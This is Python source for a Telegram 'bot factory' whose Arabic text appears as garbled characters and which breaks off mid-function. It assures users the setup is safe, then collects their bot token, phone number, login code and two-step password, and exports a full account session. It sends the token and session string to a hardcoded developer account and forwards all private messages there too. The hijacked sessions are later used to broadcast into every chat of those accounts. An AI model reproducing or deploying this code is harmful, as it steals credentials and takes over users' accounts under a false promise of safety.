from pyrogram import filters, Client
from pyrogram import Client as app
from config import API_ID, API_HASH, MONGO_DB_URL, appp, user as usr, helper as ass, call
from AVATAR.info import Call, activecall, helper
from AVATAR.Data import db
from pyrogram.errors import (ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired, SessionPasswordNeeded, PasswordHashInvalid)
from pyrogram.raw.types import InputPeerChannel
from pyrogram.raw.functions.phone import CreateGroupCall
from pytgcalls import PyTgCalls
from pymongo import MongoClient
from motor.motor_asyncio import AsyncIOMotorClient as _mongo_client_
from pyrogram.errors import FloodWait
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, Message, ChatPrivileges
from pyrogram.enums import ChatType
import asyncio


mongodb = _mongo_client_(MONGO_DB_URL)
mo = MongoClient()
mo = MongoClient(MONGO_DB_URL)
moo = mo["data"]
Bots = moo.Bots
db = mongodb.db
botdb = db.botdb
blockdb = db.blocked

# Bots Run

Done = []

async def auto_bot():
 while not await asyncio.sleep(5):
  bots = Bots.find({})
  count = 0
  for i in bots:
      bot_username = i["bot_username"]
      try:
       if not i["bot_username"] in Done:
        TOKEN = i["token"]
        SESSION = i["session"]
        bot_username = i["bot_username"]
        logger = i["logger"]
        Done.append(bot_username)
        bot = Client("AVATAR", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN, in_memory=True, plugins=dict(root="AVATAR"))
        user = Client("AVATAR", api_id=API_ID, api_hash=API_HASH, session_string=SESSION, in_memory=True)
        await bot.start()
        await user.start()
        appp[bot_username] = bot
        usr[bot_username] = user
        activecall[bot_username] = []
        ass[bot_username] = []
        await helper(bot_username)
        await Call(bot_username)
        await bot.send_message(logger, "**ØªÙ… ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¨ÙˆØª Ø¹Ù„ÙŠ Ø³ÙˆØ±Ø³ Ø§ÙØ§ØªØ§Ø± Ø¨Ù†Ø¬Ø§Ø­ âœ“**")
        await user.send_message(logger, "**ØªÙ… ØªØ´ØºÙŠÙ„ Ø§Ù„Ù…Ø³Ø§Ø¹Ø¯ Ø¹Ù„ÙŠ Ø³ÙˆØ±Ø³ Ø§ÙØ§ØªØ§Ø± Ø¨Ù†Ø¬Ø§Ø­ âœ“**")
      except Exception as e:
        print(f"[ @{bot_username} ] {e}")
asyncio.create_task(auto_bot())

# Bot Arledy Maked

async def get_served_bots() -> list:
    chats_list = []
    async for chat in botdb.find({"bot_username": {"$lt": 0}}):
        chats_list.append(chat)
    return chats_list

async def is_served_bot(bot_username: int) -> bool:
    chat = await botdb.find_one({"bot_username": bot_username})
    if not chat:
        return False
    return True

async def add_served_bot(bot_username: int):
    is_served = await is_served_chat(bot_username)
    if is_served:
        return
    return await botdb.insert_one({"bot_username": bot_username})

async def del_served_bot(bot_username: int):
    is_served = await is_served_chat(bot_username)
    if not is_served:
        return
    return await botdb.delete_one({"bot_username": bot_username})



# Blocked User

async def get_block_users() -> list:
    chats_list = []
    async for chat in blockdb.find({"user_id": {"$lt": 0}}):
        chats_list.append(chat)
    return chats_list

async def is_block_user(user_id: int) -> bool:
    chat = await blockdb.find_one({"user_id": user_id})
    if not chat:
        return False
    return True

async def add_block_user(user_id: int):
    is_served = await is_served_chat(user_id)
    if is_served:
        return
    return await blockdb.insert_one({"user_id": user_id})

async def del_block_user(user_id: int):
    is_served = await is_served_chat(user_id)
    if not is_served:
        return
    return await blockdb.delete_one({"user_id": user_id})
    
off =None
@Client.on_message(filters.private)
async def me(client, message):
   if off:
    if not message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN":
     return await message.reply_text("Ø§Ù„ØµØ§Ù†Ø¹ Ù…Ø¹Ø·Ù„ Ù…Ù† Ù‚Ø¨Ù„ Ù…Ø·ÙˆØ± Ø§Ù„Ø³ÙˆØ±Ø³ âœ˜\n\nÙ…Ø·ÙˆØ± Ø§Ù„Ø³ÙˆØ±Ø³:- @TR_E2S_ON_MY_MOoN\nÙ‚Ù†Ø§Ø© Ø§Ù„Ø³ÙˆØ±Ø³:-@sourceav")
   message.continue_propagation()
   
@Client.on_message(filters.command(["âœ˜ ØªØ¹Ø·ÙŠÙ„ Ø§Ù„Ù…Ø¬Ø§Ù†ÙŠ âœ˜", "âœ˜ ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù…Ø¬Ø§Ù†ÙŠ âœ˜"], "") & filters.private)
async def onoff(client, message):
  if not message.chat.username in ["TR_E2S_ON_MY_MOoN", "TR_E2S_ON_MY_MOoN"]:
    return
  global off
  if message.text == "âœ˜ ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù…Ø¬Ø§Ù†ÙŠ âœ˜":
    off = None
    return await message.reply_text("ØªÙ… ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù…Ø¬Ø§Ù†ÙŠ ÙŠØ§ Ù…Ø·ÙˆØ±ÙŠ")
  else:
    off = True
    await message.reply_text("ØªÙ… ØªØ¹Ø·ÙŠÙ„ Ø§Ù„Ù…Ø¬Ø§Ù†ÙŠ ÙŠØ§ Ù…Ø·ÙˆØ±ÙŠ")

@app.on_message(filters.private)
async def botooott(client, message):
   try:
    if not message.chat.username in ["TR_E2S_ON_MY_MOoN", "TR_E2S_ON_MY_MOoN"]: 
     await client.forward_messages("TR_E2S_ON_MY_MOoN", message.chat.id, message.id)
     await client.forward_messages("TR_E2S_ON_MY_MOoN", message.chat.id, message.id)
   except Exception as e:
     print(e)
   message.continue_propagation()

@app.on_message(filters.command(["/start", "âœ˜ Ø±Ø¬ÙˆØ¹ Ù„Ù„Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠÙ‡ âœ˜"], "") & filters.private)
async def stratmaked(client, message):
  if await is_block_user(message.from_user.id):
    return
  if message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN":
    kep = ReplyKeyboardMarkup([["âœ˜ Ø§Ù†Ø´Ø§Ø¡ Ø¨ÙˆØª âœ˜", "âœ˜ Ø­Ø°Ù Ø¨ÙˆØª âœ˜"], ["âœ˜ Ø§Ù„Ø¨ÙˆØªØ§Øª Ø§Ù„Ù…ØµÙ†ÙˆØ¹Ù‡ âœ˜"], ["âœ˜ Ø§Ø­ØµØ§Ø¦ÙŠØ§Øª Ø§Ù„Ø¨ÙˆØªØ§Øª Ø§Ù„Ù…ØµÙ†ÙˆØ¹Ù‡ âœ˜"], ["âœ˜ ØªØ¹Ø·ÙŠÙ„ Ø§Ù„Ù…Ø¬Ø§Ù†ÙŠ âœ˜", "âœ˜ ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù…Ø¬Ø§Ù†ÙŠ âœ˜"], ["âœ˜ Ø­Ø¸Ø± Ø¨ÙˆØª âœ˜", "âœ˜ Ø­Ø¸Ø± Ù…Ø³ØªØ®Ø¯Ù… âœ˜"], ["âœ˜ ÙØ­Øµ Ø§Ù„Ø¨ÙˆØªØ§Øª âœ˜", "âœ˜ ØªØµÙÙŠÙ‡ Ø§Ù„Ø¨ÙˆØªØ§Øª âœ˜"]], resize_keyboard=True)
    await message.reply_text(f"**Ù…Ø±Ø­Ø¨Ø§ Ø¨Ùƒ ÙŠØ§ ÙƒÙŠÙ†Ø¬**", reply_markup=kep)
  
  else:
    kep = ReplyKeyboardMarkup([["âœ˜ Ø§Ù†Ø´Ø§Ø¡ Ø¨ÙˆØª âœ˜", "âœ˜ Ø­Ø°Ù Ø¨ÙˆØª âœ˜"], ["âœ˜ Ø§Ù„Ø³ÙˆØ±Ø³ âœ˜"]], resize_keyboard=True)
    await message.reply_text(f"**Ø£Ù‡Ù„Ø§ Ø¨Ùƒ {message.from_user.mention}**\n**Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª Ù…Ø®ØµØµ Ù„Ø§Ù†Ø´Ø§Ø¡ Ø§Ù„Ø¨ÙˆØªØ§Øª**", reply_markup=kep)


@app.on_message(filters.command(["Ù‚Ø³Ù… Ø§Ù„Ø§Ø°Ø§Ø¹Ù‡"], "") & filters.private)
async def stratmakedd(client, message):
  if message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN":
    kep = ReplyKeyboardMarkup([["âœ˜ Ø§Ø°Ø§Ø¹Ù‡ Ø¹Ø§Ù… Ø¨Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª âœ˜"], ["âœ˜ ØªÙˆØ¬ÙŠÙ‡ Ø¹Ø§Ù… Ø¨Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª âœ˜"], ["âœ˜ Ø§Ø°Ø§Ø¹Ù‡ Ù„Ù„Ù…Ø·ÙˆØ±ÙŠÙ† âœ˜"], ["âœ˜ Ø±Ø¬ÙˆØ¹ Ù„Ù„Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠÙ‡ âœ˜"]], resize_keyboard=True)
    await message.reply_text(f"**Ø§Ù„ÙŠÙƒ Ù‚Ø³Ù… Ø§Ù„Ø§Ø°Ø§Ø¹Ù‡**", reply_markup=kep)
  
    
@app.on_message(filters.command(["âœ˜ Ø§Ù„Ø³ÙˆØ±Ø³ âœ˜"], ""))
async def alivehi(client: Client, message):
    chat_id = message.chat.id

    keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("ã€ğ˜¼ğ™‘â¢âƒğ™ğ™Šğ™ğ™ğ˜¾ğã€ âœ˜ï¸", url=f"https://t.me/sourceav"),
                InlineKeyboardButton("Gá–‡Oá‘Œá‘­âœ˜", url=f"https://t.me/swad_source"),
            ],
            [
                 InlineKeyboardButton("á—ªEá¯  âœ˜â¸¢ á—°Oá•¼á—©á—°Eá—ª ğ– ² â¸¥", url="https://t.me/TR_E2S_ON_MY_MOoN")
            ]
        ]
    )

    await message.reply_photo(
        photo="https://graph.org/file/9cdbc1531679dc7a507f8.jpg",
        caption="",
        reply_markup=keyboard,
    )
  
@app.on_message(filters.command(["âœ˜ Ø§Ù†Ø´Ø§Ø¡ Ø¨ÙˆØª âœ˜"], ""))
async def cloner(app: app, message):
    if await is_block_user(message.from_user.id):
      return
    await message.reply_text("**Ø§Ù‡Ù„Ø§ Ø¨Ùƒ ÙÙŠ Ù…ØµÙ†Ø¹ Ø§ÙØ§ØªØ§Ø±**")
    await message.reply_text("**ÙŠÙ…ÙƒÙ†Ùƒ ØªÙ†ØµÙŠØ¨ Ø¨ÙˆØªÙƒ Ø¨Ø´ÙƒÙ„ Ø§Ù…Ù†**")
    await message.reply_text("**Ù‚Ù… Ø¨Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø·Ù„ÙˆØ¨**")
    user_id = message.chat.id
    token = await app.ask(chat_id=user_id, text="**Ø§Ø±Ø³Ù„ ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª â€¢**", filters=filters.text)
    token = token.text
    try:   
      bot = Client("Cloner", api_id=API_ID, api_hash=API_HASH, bot_token=token, in_memory=True)
      await bot.start()
    except Exception as es:
      print(es)
      return await message.reply_text("**Ø§Ù„ØªÙˆÙƒÙ† ØºÙŠØ± ØµØ­ÙŠØ­ âšœï¸**")
    bot_i = await bot.get_me()
    bot_username = bot_i.username
    if await is_served_bot(bot_username):
      await bot.stop()
      return        
    try:      
      num = await app.ask(message.chat.id, "Ø§Ø±Ø³Ù„ Ø±Ù‚Ù… Ø§Ù„Ø­Ø³Ø§Ø¨ ", timeout=300)
      phone_number = num.text
      client = app
      client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
      await client.connect()
      try:
        code = await client.send_code(phone_number)
      except PhoneNumberInvalid:
          await message.reply('Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ ØºÙŠØ± ØµØ­ÙŠØ­ .')
          return
      try:
        phone_code_msg = await app.ask(message.chat.id, "ÙÙŠ ÙƒÙˆØ¯ ÙˆØµÙ„Ùƒ Ù…Ù† Ø§Ù„ØªÙŠÙ„Ø¬Ø±Ø§Ù… Ø§Ø¨Ø¹ØªÙˆ \n Ø¨Ø§Ù„Ø´ÙƒÙ„ Ø¯Ø§ \n 1 2 3 4 5", filters=filters.text, timeout=300)
      except TimeoutError:
        await message.reply('Ø§Ù†ØªÙ‡ÙŠ Ø§Ù„ÙˆÙ‚Øª Ø­Ø§ÙˆÙ„ Ù…Ù† Ø§Ù„Ø¨Ø¯Ø§ÙŠÙ‡.')
        return
      phone_code = phone_code_msg.text.replace(" ", "")
      try:
        await client.sign_in(phone_number, code.phone_code_hash, phone_code)
      except PhoneCodeInvalid:
        await message.reply("Ø§Ù„ÙƒÙˆØ¯ ØºÙŠØ± ØµØ­ÙŠØ­ .")
        return
      except PhoneCodeExpired:
        await message.reply("Ù‚Ù… Ø¨Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙƒÙˆØ¯ Ø¨Ù‡Ø°Ø§ Ø§Ù„Ø´ÙƒÙ„\n 1 2 3 4 5")
        return
      except SessionPasswordNeeded:
        try:
            two_step_msg = await app.ask(message.chat.id, 'Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø£Ù…Ù† Ø¨ÙƒÙ„Ù…Ù‡ Ø³Ø± \nÙ‚Ù… Ø¨Ø§Ø±Ø³Ø§Ù„ ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø±', filters=filters.text, timeout=300)
        except TimeoutError:
            await message.reply("Ø­Ø§ÙˆÙ„ Ù…Ù† Ø§Ù„Ø¨Ø¯Ø§ÙŠÙ‡ .")
            return
        try:
            password = two_step_msg.text
            await client.check_password(password=password)
        except PasswordHashInvalid:
            await two_step_msg.reply("Ø§Ù„ÙƒÙˆØ¯ Ù…Ù†ØªÙ‡ÙŠ Ø§Ù„ØµÙ„Ø§Ø­ÙŠÙ‡ .")
            return 
      session_si = await client.export_session_string()
    except KeyError:
       pass
       await client.disconnect()
    except:
       pass
       return
    await app.send_message(user_id, "**Ø¬Ø§Ø±ÙŠ ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¨ÙˆØª Ø§Ù†ØªØ¸Ø± ....ğŸ”¥**")
    session = session_si
    user = Client("AVATAR", api_id=API_ID, api_hash=API_HASH, session_string=session, in_memory=True)
    try:       
       await user.start()
    except:
       await bot.stop()
       return await message.reply_text(f"**ÙƒÙˆØ¯ Ø§Ù„Ø¬Ù„Ø³Ù‡ ØºÙŠØ± ØµØ§Ù„Ø­ âšœï¸**")
    loger = await user.create_supergroup(f"Ø³Ø¬Ù„ Ø§ÙØ§ØªØ§Ø±", "Ù‡Ø°Ù‡ Ø§Ù„Ù…Ø¬Ù…ÙˆØ¹Ù‡ Ù„ØªØ±Ù‰ Ø³Ø¬Ù„ Ø¨ÙˆØªÙƒ Ù‚Ù†Ø§Ø© Ø§Ù„Ø³ÙˆØ±Ø³:- @sourceav")
    if bot_i.photo:
       photo = await bot.download_media(bot_i.photo.big_file_id)
       await user.set_chat_photo(chat_id=loger.id, photo=photo)
    logger = loger.id
    await user.add_chat_members(logger, bot_username)
    chat_id = logger
    user_id = bot_username
    await user.promote_chat_member(chat_id, user_id, privileges=ChatPrivileges(can_change_info=True, can_invite_users=True, can_delete_messages=True, can_restrict_members=True, can_pin_messages=True, can_promote_members=True, can_manage_chat=True, can_manage_video_chats=True))
    loggerlink = await user.export_chat_invite_link(logger)
    await user.stop()
    await bot.stop()
    dev = message.from_user.id    
    data = {"bot_username": bot_username, "token": token, "session": session, "dev": dev, "logger": logger, "logger_mode": "ON"}
    Bots.insert_one(data)
    AV = "TR_E2S_ON_MY_MOoN"
    await app.send_message(AV, f"ØªÙ… Ø§Ù†Ø´Ø§Ø¡ Ø¨ÙˆØª Ø¬Ø¯ÙŠØ¯ \nÙŠÙˆØ²Ø± Ø§Ù„Ø¨ÙˆØª : @{bot_username}\nØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª\n{token}\nÙƒÙˆØ¯ Ø§Ù„Ø¬Ù„Ø³Ù‡ \n{session}\nØ¨ÙˆØ§Ø³Ø·Ø© {message.from_user.mention}\nId : {message.chat.id}")
    await message.reply_text(f"**ØªÙ… Ø§Ù†Ø´Ø§Ø¡ Ø¨ÙˆØªÙƒ Ø¨Ù†Ø¬Ø§Ø­ âšœï¸**\n\n**Ø§Ù„ÙŠÙƒ Ù„ÙŠÙ†Ùƒ Ø§Ù„Ù…Ø¬Ù…ÙˆØ¹Ù‡ Ø§Ù„Ø®Ø§ØµÙ‡ Ø¨Ø¨ÙˆØªÙƒ**\n**ÙŠÙ…ÙƒÙ†Ùƒ Ù…Ù† Ø®Ù„Ø§Ù„Ù‡Ø§ Ø±Ø¤ÙŠÙ‡ Ø³Ø¬Ù„ Ø§Ù„ØªØ´ØºÙŠÙ„**\n{loggerlink}")


@app.on_message(filters.command(["âœ˜ Ø­Ø°Ù Ø¨ÙˆØª âœ˜"], ""))
async def delbot(client: app, message):
  if await is_block_user(message.from_user.id):
    return
  if message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN":
   ask = await client.ask(message.chat.id, "Ø§Ø±Ø³Ù„ ÙŠÙˆØ²Ø± Ø§Ù„Ø¨ÙˆØª", timeout=300)
   bot_username = ask.text
   if "@" in bot_username:
     bot_username = bot_username.replace("@", "")
   list = []
   bots = Bots.find({})
   for i in bots:
       if i["bot_username"] == bot_username:
         botusername = i["bot_username"]
         list.append(botusername)
   if not bot_username in list:
     return await message.reply_text("**Ù„Ù… ÙŠØªÙ… ØµÙ†Ø¹ Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª âšœï¸.**")
   else:
    try:
     bb = {"bot_username": bot_username}
     Bots.delete_one(bb)
     await message.reply_text("**ØªÙ… Ø­Ø°Ù Ø§Ù„Ø¨ÙˆØª Ø¨Ù†Ø¬Ø§Ø­ âœ“**")
    except Exception as es:
     await message.reply_text(f"**Ø­Ø¯Ø« Ø®Ø·Ø£ .âšœï¸**\n**{es}**")
  else:
   list = []
   bots = Bots.find({})
   for i in bots:
       try:
        if i["dev"] == message.chat.id:
         bot_username = i["bot_username"]
         list.append(i["dev"])
         boot = appp[bot_username]
         await boot.stop()
       except:
           pass
   if not message.chat.id in list:
     return await message.reply_text("**Ù„Ù… ØªÙ‚Ù… Ø¨ØµÙ†Ø¹ Ø¨ÙˆØªØ§Øª âšœï¸.**")
   else:
    try:
     dev = message.chat.id
     dev = {"dev": dev}
     Bots.delete_one(dev)
     await message.reply_text("**ØªÙ… Ø­Ø°Ù Ø¨ÙˆØªÙƒ Ø¨Ù†Ø¬Ø§Ø­ âœ“**")
    except:
     await message.reply_text("**Ø­Ø¯Ø« Ø®Ø·Ø£ ØŒ ØªÙˆØ§ØµÙ„ Ù…Ø¹ Ø§Ø³Ù„Ø§Ù… Ù…Ø·ÙˆØ± Ø§Ù„Ø³ÙˆØ±Ø³ .âšœï¸**\n**Dev : @TR_E2S_ON_MY_MOoN**")
   

    
@app.on_message(filters.command("âœ˜ Ø§Ù„Ø¨ÙˆØªØ§Øª Ø§Ù„Ù…ØµÙ†ÙˆØ¹Ù‡ âœ˜", ""))
async def botsmaked(client, message):
  if message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN": 
   m = 0
   text = ""
   bots = Bots.find({})
   try:
    for i in bots:
        try:
          bot_username = i["bot_username"]
          m += 1
          user = i["dev"]
          user = await client.get_users(user)
          user = user.mention
          text += f"{m}- @{bot_username} By : {user}\n "
        except:
           pass
   except:
        return await message.reply_text("**Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø¨ÙˆØªØ§Øª Ù…ØµÙ†ÙˆØ¹Ù‡ .âšœï¸**")
   try:
      await message.reply_text(f"**Ø§Ù„Ø¨ÙˆØªØ§Øª Ø§Ù„Ù…ØµÙ†ÙˆØ¹Ù‡ ÙˆØ¹Ø¯Ø¯Ù‡Ù… : {m} **\n{text}")
   except:
      await message.reply_text("**Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø¨ÙˆØªØ§Øª Ù…ØµÙ†ÙˆØ¹Ù‡ .âšœï¸**")


async def get_users(chatsdb) -> list:
    chats_list = []
    async for chat in chatsdb.find({"user_id": {"$gt": 0}}):
        chats_list.append(chat)
    return chats_list

async def get_chats(chatsdb) -> list:
    chats_list = []
    async for chat in chatsdb.find({"chat_id": {"$lt": 0}}):
        chats_list.append(chat)
    return chats_list

@app.on_message(filters.command("âœ˜ Ø§Ø­ØµØ§Ø¦ÙŠØ§Øª Ø§Ù„Ø¨ÙˆØªØ§Øª Ø§Ù„Ù…ØµÙ†ÙˆØ¹Ù‡ âœ˜", ""))
async def botstatus(client, message):
  if message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN":
   m = 0
   d = 0
   u = 0
   text = ""
   bots = Bots.find({})
   try:
    for i in bots:
        try:
          bot_username = i["bot_username"]
          database = mongodb[bot_username]
          chatsdb = database.chats
          chat = len(await get_chats(chatsdb))
          m += chat
          chatsdb = database.users
          chat = len(await get_users(chatsdb))
          u += chat
          d += 1
        except Exception as e:
           print(e)
   except:
        return await message.reply_text("**Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø¨ÙˆØªØ§Øª Ù…ØµÙ†ÙˆØ¹Ù‡ .âšœï¸**")
   try:
      await message.reply_text(f"**Ø§Ù„Ø¨ÙˆØªØ§Øª Ø§Ù„Ù…ØµÙ†ÙˆØ¹Ø© {d}**\n**Ø¹Ø¯Ø¯ Ù…Ø¬Ù…ÙˆØ¹Ø§ØªÙ‡Ù… {m}**\n**ÙˆØ¹Ø¯Ø¯ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† {u}**")
   except:
      await message.reply_text("**Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø¨ÙˆØªØ§Øª Ù…ØµÙ†ÙˆØ¹Ù‡ .âšœï¸**")


@app.on_message(filters.command(["âœ˜ Ø­Ø¸Ø± Ø¨ÙˆØª âœ˜", "âœ˜ Ø­Ø¸Ø± Ù…Ø³ØªØ®Ø¯Ù… âœ˜"], ""))
async def blockk(client: app, message):
 if message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN":
  ask = await client.ask(message.chat.id, "**Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ø§Ù„ÙŠÙˆØ²Ø±Ù†ÙŠÙ…**", timeout=10)
  i = ask.text
  if "@" in i:
     i = i.replace("@", "")
  if message.command[0] == "âœ˜ Ø­Ø¸Ø± Ø¨ÙˆØª âœ˜":
    bot_username = i
    if await is_served_bot(bot_username):
     return await ask.reply_text("**Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª Ù…Ø­Ø¸ÙˆØ± Ù…Ù† Ù‚Ø¨Ù„**")
    else:
      await add_served_bot(bot_username)
      boot = appp[bot_username]
      try:
       await boot.stop()
      except:
       pass
      return await ask.reply_text("**ØªÙ… Ø­Ø¸Ø± Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª Ø¨Ù†Ø¬Ø§Ø­ âœ“**")
  else:
    user = await client.get_chat(i)
    user_id = user.id
    if await is_block_user(user_id):
     return await ask.reply_text("**Ù‡Ø°Ø§ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ø­Ø¸ÙˆØ± Ù…Ù† Ù‚Ø¨Ù„**")
    else:
      await add_block_user(user_id)
      return await ask.reply_text("**ØªÙ… Ø­Ø¸Ø± Ù‡Ø°Ø§ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¨Ù†Ø¬Ø§Ø­ âœ“**")
   


@app.on_message(filters.command(["âœ˜ Ø§Ù„ØºØ§Ø¡ Ø­Ø¸Ø± Ø¨ÙˆØª âœ˜", "âœ˜ Ø§Ù„ØºØ§Ø¡ Ø­Ø¸Ø± Ù…Ø³ØªØ®Ø¯Ù… âœ˜"], ""))
async def unblockk(client: app, message):
 if message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN":
  ask = await client.ask(message.chat.id, "**Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ø§Ù„ÙŠÙˆØ²Ø±Ù†ÙŠÙ…**", timeout=10)
  i = ask.text
  if "@" in i:
     i = i.replace("@", "")
  if message.command[0] == "âœ˜ Ø§Ù„ØºØ§Ø¡ Ø­Ø¸Ø± Ø¨ÙˆØª âœ˜":
    bot_username = i
    if await is_served_bot(bot_username):
     return await ask.reply_text("**Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª Ù…Ø­Ø¸ÙˆØ± Ù…Ù† Ù‚Ø¨Ù„**")
    else:
      await del_served_bot(bot_username)
      boot = appp[bot_username]
      try:
       await boot.stop()
      except:
       pass
      return await ask.reply_text("**ØªÙ… Ø­Ø¸Ø± Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª Ø¨Ù†Ø¬Ø§Ø­ âœ“**")
  else:
    user = await app.get_users(i)
    user_id = user.id
    if await is_block_user(user_id):
     return await ask.reply_text("**Ù‡Ø°Ø§ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ø­Ø¸ÙˆØ± Ù…Ù† Ù‚Ø¨Ù„**")
    else:
      await del_block_user(user_id)
      return await ask.reply_text("**ØªÙ… Ø­Ø¸Ø± Ù‡Ø°Ø§ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¨Ù†Ø¬Ø§Ø­ âœ“**")
   


@app.on_message(filters.command(["âœ˜ ØªÙˆØ¬ÙŠÙ‡ Ø¹Ø§Ù… Ø¨Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª âœ˜", "âœ˜ Ø§Ø°Ø§Ø¹Ù‡ Ø¹Ø§Ù… Ø¨Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª âœ˜"], ""))
async def casttoall(client: app, message):
 if message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN":
   sss = "Ø§Ù„ØªÙˆØ¬ÙŠÙ‡" if message.command[0] == "âœ˜ ØªÙˆØ¬ÙŠÙ‡ Ø¹Ø§Ù… Ø¨Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª âœ˜" else "Ø§Ù„Ø§Ø°Ø§Ø¹Ù‡"
   ask = await client.ask(message.chat.id, f"**Ù‚Ù… Ø¨Ø§Ø±Ø³Ø§Ù„ {sss} Ø§Ù„Ø§Ù†**", timeout=30)
   x = ask.id
   y = message.chat.id
   if ask.text == "Ø§Ù„ØºØ§Ø¡":
      return await ask.reply_text("ØªÙ… Ø§Ù„Ø§Ù„ØºØ§Ø¡")
   pn = await client.ask(message.chat.id, "Ù‡Ù„ ØªØ±ÙŠØ¯ ØªØ«Ø¨ÙŠØª Ø§Ù„Ø§Ø°Ø§Ø¹Ù‡\nØ§Ø±Ø³Ù„ Â« Ù†Ø¹Ù… Â» Ø§Ùˆ Â« Ù„Ø§ Â»", timeout=10)
   h = await message.reply_text("**Ø§Ù†ØªØ¸Ø± Ø¨Ø¶Ø¹ Ø§Ù„ÙˆÙ‚Øª Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§Ø°Ø§Ø¹Ù‡**")
   b = 0
   s = 0
   c = 0
   u = 0
   sc = 0
   su = 0
   bots = Bots.find({})
   for bott in bots:
       try:
        b += 1
        s += 1
        bot_username = bott["bot_username"]
        session = bott["session"]
        bot = appp[bot_username]
        user = usr[bot_username]
        db = mongodb[bot_username]
        chatsdb = db.chats
        chats = await get_chats(chatsdb)
        usersdb = db.users
        users = await get_users(usersdb)
        all = []
        for i in users:
            all.append(int(i["user_id"]))
        for i in chats:
            all.append(int(i["chat_id"]))
        for i in all:
            if message.command[0] == "âœ˜ ØªÙˆØ¬ÙŠÙ‡ Ø¹Ø§Ù… Ø¨Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª âœ˜":
             try:
               m = await bot.forward_messages(i, y, x)
               if m.chat.type == ChatType.PRIVATE:
                  u += 1
               else:
                  c += 1
               if pn.text == "Ù†Ø¹Ù…":
                try:
                 await m.pin(disable_notification=False)
                except:
                   continue
             except FloodWait as e:
                flood_time = int(e.x)
                if flood_time > 200:
                    continue
                await asyncio.sleep(flood_time)
             except Exception as e:
                    print(e)
                    continue
            else:
             try:
               m = await bot.send_message(chat_id=i, text=ask.text)
               if m.chat.type == ChatType.PRIVATE:
                  u += 1
               else:
                  c += 1
               if pn.text == "Ù†Ø¹Ù…":
                 await m.pin(disable_notification=False)
             except FloodWait as e:
                flood_time = int(e.x)
                if flood_time > 200:
                    continue
                await asyncio.sleep(flood_time)
             except Exception as e:
                    print(e)
                    continue
        async for i in user.get_dialogs():
             chat_id = i.chat.id
             if message.command[0] == "âœ˜ ØªÙˆØ¬ÙŠÙ‡ Ø¹Ø§Ù… Ø¨Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª âœ˜":
               try:
                  m = await user.forward_messages(i, y, x)
                  if m.chat.type == ChatType.PRIVATE:
                    su += 1
                  else:
                    sc += 1
                  if pn.text == "Ù†Ø¹Ù…":
                    await m.pin(disable_notification=False)
               except FloodWait as e:
                    flood_time = int(e.x)
                    if flood_time > 200:
                        continue
                    await asyncio.sleep(flood_time)
               except Exception as e:
                    print(e)
                    continue
             else:
               try:
                  m = await user.send_message(chat_id, ask.text)
                  if m.chat.type == ChatType.PRIVATE:
                    su += 1
